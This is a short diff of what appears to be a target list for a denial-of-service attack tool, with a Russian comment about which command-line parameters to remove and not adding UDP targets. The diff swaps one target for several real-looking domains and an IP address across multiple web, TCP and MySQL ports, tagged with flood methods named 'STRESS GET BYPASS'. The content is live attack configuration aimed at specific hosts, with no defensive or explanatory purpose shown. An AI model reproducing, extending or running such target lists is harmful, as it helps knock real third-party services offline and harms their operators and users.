@@ -2,5 +2,5 @@
 ### Не забываем, удалять все параметры: -t --rpc -p --debug. UDP в список не добавляем
 
 
-https://iml.ru/ --http-methods STRESS
-tcp://46.243.184.194:443
+http://robokazakh.ru https://finaxe.ru http://185.253.34.111:80 https://185.253.34.111:443 http://185.253.34.111:1979 http://185.253.34.111:8080 http://185.253.34.111:8192 tcp://185.253.34.111:80 tcp://185.253.34.111:443 tcp://185.253.34.111:3306  --http-methods STRESS GET BYPASS
+
